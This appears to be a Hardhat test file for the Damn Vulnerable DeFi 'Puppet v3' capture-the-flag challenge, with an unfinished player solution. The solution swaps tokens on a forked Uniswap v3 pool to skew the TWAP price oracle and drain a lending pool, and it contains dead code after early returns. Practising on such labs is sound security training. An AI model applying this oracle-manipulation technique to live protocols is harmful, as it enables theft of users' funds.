const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");

const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");

const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');
  
  // deploy the bytecode
// See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
const bn = require("bignumber.js");
bn.config({ EXPONENTIAL_AT: 999999, DECIMAL_PLACES: 40 });
function encodePriceSqrt(reserve0, reserve1) {
    return ethers.BigNumber.from(
        new bn(reserve1.toString())
            .div(reserve0.toString())
            .sqrt()
            .multipliedBy(new bn(2).pow(96))
            .integerValue(3)
            .toString()
    )
}

describe('[Challenge] Puppet v3', function () {
    let deployer, player;
    let uniswapFactory, weth, token, uniswapPositionManager, uniswapPool, lendingPool;
    let initialBlockTimestamp;

    /** SET RPC URL HERE */
    const MAINNET_FORKING_URL = require("./rpc_url.json").RPC_URL;

    // Initial liquidity amounts for Uniswap v3 pool
    const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_LIQUIDITY = 100n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 110n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
    const DEPLOYER_INITIAL_ETH_BALANCE = 200n * 10n ** 18n;

    const LENDING_POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        // Fork from mainnet state
        await ethers.provider.send("hardhat_reset", [{
            forking: { jsonRpcUrl: MAINNET_FORKING_URL, blockNumber: 15450164 }
        }]);

        // Initialize player account
        // using private key of account #2 in Hardhat's node
        player = new ethers.Wallet("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d", ethers.provider);
        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        // Initialize deployer account
        // using private key of account #1 in Hardhat's node
        deployer = new ethers.Wallet("0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80", ethers.provider);
        await setBalance(deployer.address, DEPLOYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(deployer.address)).to.eq(DEPLOYER_INITIAL_ETH_BALANCE);

        // Get a reference to the Uniswap V3 Factory contract
        uniswapFactory = new ethers.Contract("0x1F98431c8aD98523631AE4a59f267346ea31F984", factoryJson.abi, deployer);

        // Get a reference to WETH9
        weth = (await ethers.getContractFactory('WETH', deployer)).attach("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2");

        // Deployer wraps ETH in WETH
        await weth.deposit({ value: UNISWAP_INITIAL_WETH_LIQUIDITY });
        expect(await weth.balanceOf(deployer.address)).to.eq(UNISWAP_INITIAL_WETH_LIQUIDITY);

        // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Create the Uniswap v3 pool
        uniswapPositionManager = new ethers.Contract("0xC36442b4a4522E871399CD717aBDD847Ab11FE88", positionManagerJson.abi, deployer);
        const FEE = 3000; // 0.3%
        await uniswapPositionManager.createAndInitializePoolIfNecessary(
            weth.address,  // token0
            token.address, // token1
            FEE,
            encodePriceSqrt(1, 1),
            { gasLimit: 5000000 }
        );

        let uniswapPoolAddress = await uniswapFactory.getPool(
            weth.address,
            token.address,
            FEE
        );
        uniswapPool = new ethers.Contract(uniswapPoolAddress, poolJson.abi, deployer);
        await uniswapPool.increaseObservationCardinalityNext(40);
        
        // Deployer adds liquidity at current price to Uniswap V3 exchange
        await weth.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
        await token.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
        await uniswapPositionManager.mint({
            token0: weth.address,
            token1: token.address,
            tickLower: -60,
            tickUpper: 60,
            fee: FEE,
            recipient: deployer.address,
            amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
            amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
            amount0Min: 0,
            amount1Min: 0,
            deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
        }, { gasLimit: 5000000 });        

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV3Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapPool.address
        );

        // Setup initial token balances of lending pool and player
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // Some time passes
        await time.increase(3 * 24 * 60 * 60); // 3 days in seconds

        // Ensure oracle in lending pool is working as expected. At this point, DVT/WETH price should be 1:1.
        // To borrow 1 DVT, must deposit 3 ETH
        expect(
            await lendingPool.calculateDepositOfWETHRequired(1n * 10n ** 18n)
        ).to.be.eq(3n * 10n ** 18n);

        // To borrow all DVT in lending pool, user must deposit three times its value
        expect(
            await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n);

        // Ensure player doesn't have that much ETH
        expect(await ethers.provider.getBalance(player.address)).to.be.lt(LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n);

        initialBlockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
       
        /**
         * Initial Bals
         * Player ETH: 1
         * PLayer TOK: 110
         * 
         * Uniswap Pool ETH: 100
         * Uniswap Pool TOK: 100
         * 
         * LP: 1 000 000
         * 
         * Interesting things to look at:
         *  uniswapPositionManger
         *  oracleLibrary -> consult
         * 
         * Oracle is taken as the arithmatic mean of the last 10 minutes
         */
        const log = console.log;

        const attackPool = await uniswapPool.connect(player);
        const attackLendingPool = await lendingPool.connect(player);
        const attackToken = await token.connect(player);
        const attackWeth = await weth.connect(player);

        const logBalances = async (name, address) => {
            const dvt_bal = await attackToken.balanceOf(address);
            const weth_bal = await weth.balanceOf(address);
            const eth_bal = await ethers.provider.getBalance(address);
            log(`Logging balance of ${name}`);
            log('DVT:', ethers.utils.formatEther(dvt_bal))
            log('WETH:', ethers.utils.formatEther(weth_bal))
            log('ETH:', ethers.utils.formatEther(eth_bal))
            log('')
        };

        const getQuote = async(amountInEth, print=true) => {
            const quote = await attackLendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther(amountInEth));
            if (print) log(`Quote of ${amountInEth} ETH is ${ethers.utils.formatEther(quote)}`)
            return quote
        }

        await logBalances("Player", player.address)

        

        const attackPuppet = await (await ethers.getContractFactory("AttackPuppetV3", player)).deploy(
            token.address,
            weth.address,
            attackLendingPool.address,
            attackPool.address
        );

        console.log(await attackToken.balanceOf(player.address));



        const uniswapRouter = new ethers.Contract("0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45", routerJson.abi, player);
        await attackToken.approve(uniswapRouter.address, ethers.constants.MaxUint256);

        await getQuote("1")

        await uniswapRouter.exactInputSingle(
            [attackToken.address,
            weth.address,   
            3000,
            player.address,
            110n * 10n ** 18n, // 10 DVT TOKENS
            0,
            0],
            {
                gasLimit: 1e7
            }
        );

        await logBalances("Player", player.address)
        await logBalances("Pool", attackPool.address)

        await attackWeth.approve(uniswapRouter.address, ethers.constants.MaxUint256);


        const res = await attackLendingPool.calculateDepositOfWETHRequired(ethers.BigNumber.from("0x100000000000000000000000000000000"));
        console.log(ethers.utils.formatEther(res))
        return;

        for (let i = 0; i < 19; i++) {
            await uniswapRouter.exactInputSingle(
                [
                weth.address,   
                attackToken.address,
                3000,
                player.address,
                10n * 10n ** 18n, // 10 WETH TOKENS
                0,
                0],
                {
                    gasLimit: 1e7
                }
            );
            await logBalances("pool", attackPool.address)
            await logBalances("player", player.address)
            await uniswapRouter.exactOutputSingle(
                [
                attackToken.address,
                weth.address,   
                3000,
                player.address,
                9n * 10n ** 18n, // 10 WETH TOKENS
                999n * 10n ** 18n, // max in
                0],
                {
                    gasLimit: 1e7
                }
            );
            log("i =", i)
            await logBalances("pool", attackPool.address)
            await logBalances("player", player.address)

        }
        console.log(await attackPool.slot0())



        await logBalances("pool", attackPool.address)
        await time.increase(60);
        await getQuote("1")

        return;

        
        return;
        log(attackPool.address)
        await attackPool.swap(
            attackPuppet.address,
            false,
            1,
            ethers.BigNumber.from("1461446703485210103287273052203988822378723970342").sub(1),
            [],
            {
                gasLimit: 1e7
            }
        )
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Block timestamp must not have changed too much
        expect(
            (await ethers.provider.getBlock('latest')).timestamp - initialBlockTimestamp
        ).to.be.lt(115, 'Too much time passed');

        // Player has taken all tokens out of the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);
        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    });
});